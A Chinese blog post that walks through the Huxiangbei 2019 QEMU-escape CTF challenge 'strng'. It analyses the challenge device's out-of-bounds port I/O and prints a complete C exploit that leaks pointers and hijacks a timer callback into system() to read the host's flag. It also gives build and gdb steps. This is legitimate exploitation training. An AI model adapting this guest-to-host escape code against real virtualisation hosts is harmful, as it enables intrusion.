@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>hxb2019 strng2 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这道题是湖湘杯2019的一道QEMU pwn，题目下载(提取码: 4wag)。QEMU pwn题目一般是基于QEMU源码进行修改或者添加，在QEMU模拟的PCI设备中引入漏洞，选手需要利用漏洞读取宿主机上的flag文件。解压文件，查看内容： 1234567891011$ cat launch.sh#! &#x2F;bin&#x2F;sh.&#x2F;qemu-system-x86_64 -init">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hxb2019 strng2">
+<meta property="og:url" content="http://example.com/2020/03/23/hxb2019-strng2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这道题是湖湘杯2019的一道QEMU pwn，题目下载(提取码: 4wag)。QEMU pwn题目一般是基于QEMU源码进行修改或者添加，在QEMU模拟的PCI设备中引入漏洞，选手需要利用漏洞读取宿主机上的flag文件。解压文件，查看内容： 1234567891011$ cat launch.sh#! &#x2F;bin&#x2F;sh.&#x2F;qemu-system-x86_64 -init">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/strng/strng1.png">
+<meta property="og:image" content="http://example.com/images/strng/strng2.png">
+<meta property="og:image" content="http://example.com/images/strng/strng3.png">
+<meta property="og:image" content="http://example.com/images/strng/strng4.png">
+<meta property="og:image" content="http://example.com/images/strng/strng5.png">
+<meta property="og:image" content="http://example.com/images/strng/strng6.png">
+<meta property="og:image" content="http://example.com/images/strng/strng7.png">
+<meta property="article:published_time" content="2020-03-23T04:30:16.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.758Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Virtual">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/strng/strng1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-hxb2019-strng2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/23/hxb2019-strng2/" class="article-date">
+  <time datetime="2020-03-23T04:30:16.000Z" itemprop="datePublished">2020-03-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      hxb2019 strng2
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这道题是湖湘杯2019的一道QEMU pwn，<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Ea5uQXRfr9YNWKyoLhUxXw">题目下载</a>(提取码: 4wag)。QEMU pwn题目一般是基于QEMU源码进行修改或者添加，在QEMU模拟的PCI设备中引入漏洞，选手需要利用漏洞读取宿主机上的flag文件。<br>解压文件，查看内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat launch.sh</span><br><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line">.&#x2F;qemu-system-x86_64 </span><br><span class="line">-initrd .&#x2F;rootfs.cpio </span><br><span class="line">-kernel .&#x2F;vmlinuz-4.8.0-52-generic </span><br><span class="line">-append &#39;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram oops&#x3D;panic panic&#x3D;1&#39; </span><br><span class="line">-enable-kvm </span><br><span class="line">-monitor &#x2F;dev&#x2F;null </span><br><span class="line">-m 64M --nographic -L .&#x2F;dependency&#x2F;usr&#x2F;local&#x2F;share&#x2F;qemu </span><br><span class="line">-L pc-bios </span><br><span class="line">-device strng</span><br></pre></td></tr></table></figure>
+<p>通过<code>-device strng</code>可知添加的可能存在漏洞的设备名称为<code>strng</code>，用IDA加载qemu-system-x86_64, 并在Function name中搜索strng。<br><img src="/images/strng/strng1.png"><br>查看strng_class_init()<br><img src="/images/strng/strng2.png"><br>可知strng设备的vendor_id:device_id为1234:11e9，下面运行QEMU，可能会遇到错误。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo .&#x2F;launch.sh</span><br><span class="line">.&#x2F;qemu-system-x86_64: error while loading shared libraries: libiscsi.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
+<p>解决方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;sahlberg&#x2F;libiscsi.git</span><br><span class="line">$ .&#x2F;autogen.sh</span><br><span class="line">$ .&#x2F;configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ cp &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libiscsi.so.7 &#x2F;lib&#x2F;libiscsi.so.2</span><br></pre></td></tr></table></figure>
+<p>再次启动QEMU并查看PCI设备：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo .&#x2F;launch.sh</span><br><span class="line">Welcome to QEMU-ESCAPE</span><br><span class="line">qemu login: root</span><br><span class="line"># lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:11e9</span><br></pre></td></tr></table></figure>
+<p>通过比对vendor_id和device_id可以确定strng设备的PCI地址为00:04.0，查看strng设备的地址空间：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat &#x2F;sys&#x2F;devices&#x2F;pci0000:00&#x2F;0000:00:04.0&#x2F;resource</span><br><span class="line">start              end                flags</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200 # MMIO</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101 # PMIO</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>也可以通过/proc/iomem和/proc/ioports两个文件来查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cat &#x2F;proc&#x2F;ioports</span><br><span class="line">c050-c057 : 0000:00:04.0</span><br><span class="line"># cat &#x2F;proc&#x2F;iomem</span><br><span class="line">febf1000-febf10ff : 0000:00:04.0</span><br></pre></td></tr></table></figure>
+<p>端口号c050-c057和物理地址febf1000-febf10ff是属于strng设备的, 对这些地址空间进行读写操作就可以触发对应的strng函数。地址空间和strng函数的绑定是在pci_strng_realize()中调用memory_region_init_io()实现的：<br><img src="/images/strng/strng3.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000E19080 strng_mmio_ops  dq offset strng_mmio_read; read</span><br><span class="line">.data.rel.ro:0000000000E19080                                         ; DATA XREF: pci_strng_realize+75↑o</span><br><span class="line">.data.rel.ro:0000000000E19080                 dq offset strng_mmio_write; write</span><br><span class="line">...</span><br><span class="line">.data.rel.ro:0000000000E19100 strng_pmio_ops  dq offset strng_pmio_read; read</span><br><span class="line">.data.rel.ro:0000000000E19100                                         ; DATA XREF: pci_strng_realize+CB↑o</span><br><span class="line">.data.rel.ro:0000000000E19100                 dq offset strng_pmio_write; write</span><br></pre></td></tr></table></figure>
+<p>下面就需要重点分析strng函数了：<br><img src="/images/strng/strng4.png"><br><img src="/images/strng/strng5.png"><br>注释为正确解析后的代码，IDA有时候不能正确解析结构体中的结构，需要自己分析然后注释凑合看。其中的struct STRNGState结构体没有自动解析，需要在Local Types中找到这个结构体并双击，就可以解析到Structures里了<br><img src="/images/strng/strng6.png"><br><img src="/images/strng/strng7.png"><br>可以看到strng_pmio_read和strng_pmio_write中有越界读和越界写的问题，越界写的触发过程是调用一次strng_pmio_write，设置addr=0，就会跳转到opaque-&gt;addr=val这条语句，设置val为一个大于regs数组大小的值，再调用一次strng_pmio_write，设置addr=4，即可触发漏洞，将第一次设置val值对应的位置写上本次val的值。<br>regs后面是一个QEMUTimer_0结构体，这个结构体是一个定时器，其中cb是函数指针（callback function），其初始化是在pci_strng_realize()中实现的，初始化为strng_timer()，因此知道cb的地址，减去strng_timer()的偏移即可得出elf在内存中的基地址。opaque是传给cb的参数，可以在timerlist_run_timers()中看到。<br>那么思路如下：<br>1.越界读出cb函数指针的地址，用cb的地址减去strng_timer()的偏移得出elf的基地址；<br>2.用system@plt加上elf基地址得出system地址；<br>3.越界读出QEMUTimer_0里opaque的地址；<br>4.越界写将QEMUTimer_0里opaque的地址写为上层opaque-&gt;regs[3]的地址；<br>5.用mmio在opaque-&gt;regs[3]~[4]写上”cat flag”；<br>6.越界写将cb写为system的地址<br>7.启动定时器(strng_pmio_write即可启动定时器）<br>完整exploit如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_arbread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>, offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_arbwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>, offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = (<span class="keyword">char</span>*)mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak elf base addr</span></span><br><span class="line">    <span class="keyword">uint64_t</span> cb_addr = pmio_arbread(<span class="number">0x114</span>);</span><br><span class="line">    cb_addr = cb_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    cb_addr += pmio_arbread(<span class="number">0x110</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = cb_addr - <span class="number">0x29ac8e</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = elf_base + <span class="number">0x200D50</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak cb addr: 0x%lx\n&quot;</span>, cb_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: 0x%lx\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system addr: 0x%lx\n&quot;</span>, system_addr);</span><br><span class="line">    <span class="comment">// leak opaque addr</span></span><br><span class="line">    <span class="keyword">uint64_t</span> opaque_addr = pmio_arbread(<span class="number">0x11c</span>);</span><br><span class="line">    opaque_addr = opaque_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    opaque_addr += pmio_arbread(<span class="number">0x118</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak opaque addr: 0x%lx\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write parameter addr first</span></span><br><span class="line">    <span class="keyword">uint64_t</span> para_addr = opaque_addr + <span class="number">0xb04</span>;</span><br><span class="line">    pmio_arbwrite(<span class="number">0x118</span>, para_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set flag first and then overwrite timer func pointer and trigger timer</span></span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x20746163</span>); <span class="comment">// &#x27;cat &#x27;</span></span><br><span class="line">    mmio_write(<span class="number">16</span>, <span class="number">0x67616c66</span>); <span class="comment">// &#x27;flag&#x27;</span></span><br><span class="line">    pmio_arbwrite(<span class="number">0x110</span>, system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] flag: \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -O0 -static -o exploit exploit.c</span><br></pre></td></tr></table></figure>
+<p>因为题目使用的busybox没有库文件，因此要用静态编译。编译后将exploit复制到rootfs/pwn目录中执行如下打包命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -ov -F ..&#x2F;rootfs.cpio</span><br><span class="line">$ cd ..</span><br><span class="line">$ sudo .&#x2F;launch.sh</span><br><span class="line">...</span><br><span class="line"># &#x2F;pwn&#x2F;exploit</span><br><span class="line">mmio_mem @ 0x7fed0d087000</span><br><span class="line">[+] leak cb addr: 0x5566c08f4c8e</span><br><span class="line">[+] elf base: 0x5566c065a000</span><br><span class="line">[+] system addr: 0x5566c085ad50</span><br><span class="line">[+] leak opaque addr: 0x5566c26b9bd0</span><br><span class="line">[+] flag: </span><br><span class="line"># flag&#123;f4nr0ng1992&#125;</span><br></pre></td></tr></table></figure>
+<p>调试方法和之前的文章稍有差别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo gdb qemu-system-x86_64</span><br><span class="line">(gdb) b strng_mmio_read</span><br><span class="line">(gdb) b strng_mmio_write</span><br><span class="line">(gdb) b strng_pmio_read</span><br><span class="line">(gdb) b strng_pmio_write</span><br><span class="line">(gdb) run -initrd .&#x2F;rootfs.cpio -kernel .&#x2F;vmlinuz-4.8.0-52-generic -append &#39;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram oops&#x3D;panic panic&#x3D;1&#39; -enable-kvm -monitor &#x2F;dev&#x2F;null -m 64M --nographic -L .&#x2F;dependency&#x2F;usr&#x2F;local&#x2F;share&#x2F;qemu -L pc-bios -device strng</span><br></pre></td></tr></table></figure>
+<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197650">https://www.anquanke.com/post/id/197650</a><br><a target="_blank" rel="noopener" href="https://www.xd10086.com/posts/2010703677257798825/">https://www.xd10086.com/posts/2010703677257798825/</a>  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/03/23/hxb2019-strng2/" data-id="ckhe7o4n2004xchl775j8eu39" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/05/27/Qemu%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E4%B9%8B%E9%97%B4%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Qemu虚拟机与宿主机之间文件传输
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/02/%E8%B0%83%E8%AF%95Qemu-CVE-2016-4952/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">调试Qemu CVE-2016-4952</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a 